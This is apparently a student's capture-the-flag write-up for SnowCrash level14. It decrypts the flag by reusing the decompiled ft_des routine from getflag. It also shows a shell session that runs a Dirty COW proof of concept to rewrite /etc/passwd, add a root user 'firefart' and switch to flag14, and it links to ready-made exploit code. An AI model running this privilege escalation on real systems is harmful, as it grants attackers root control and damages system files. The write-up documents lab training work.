# PWN

level14 drops us in a fully empty profile, nothing in the user home, and running the `find` command to get anything owned by the user / the users group yields nothing

without anything to use given to us by the subject, we turn to `getflag` to find our flag in there
exporting our file to the host machine, we used ghidra to decompile the executable

from there, we look at the main function (here in `main.c`) and see between some security measures that to get a flag, the main function runs
```c
flagXX = (char *)ft_des(encrypted_flagXX);
fputs(flag ,stdout);
```

for each flag, checking the UID of the user running it (the flagXX profiles are in the format 30XX)

here is the code for the flag14
```c
else {
    if (_Var6 != 0xbc6) goto LAB_08048e06;
    pcVar4 = (char *)ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");
    fputs(pcVar4,__stream);
}
```

so the encrypted flag for level 14 is `g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|` (note: this flag is longer than all previous flags)

we then get ft_des from the decompiled binary and add a main function to run it on its own
we pass our encrypted flag and tada! our flag appears

To make sure we did in fact have the right flag, we used a second method to get said flag

looking at the iso, we can notice that it is vulnerable to the `Dirty COW` exploit, that lets a user escalate privilege to root ([wikipedia page of the exploit](https://en.wikipedia.org/wiki/Dirty_COW))
looking it up we find [a Github page]((https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)) listing some ready made code to run to use the exploit.

from there we can get root privilege, log in to flag14, and get the flag:

```
level14@SnowCrash:~$ cd /tmp/
level14@SnowCrash:/tmp$ vim pwn.c
level14@SnowCrash:/tmp$ gcc -pthread pwn.c -o pwn -lcrypt
level14@SnowCrash:/tmp$ ./pwn
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

level14@SnowCrash:/tmp$ su firefart
Password:
firefart@SnowCrash:/tmp# cd
firefart@SnowCrash:# su flag14
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
flag14@SnowCrash:~$ getflag
```
and we've confirmed we've got the correct flag !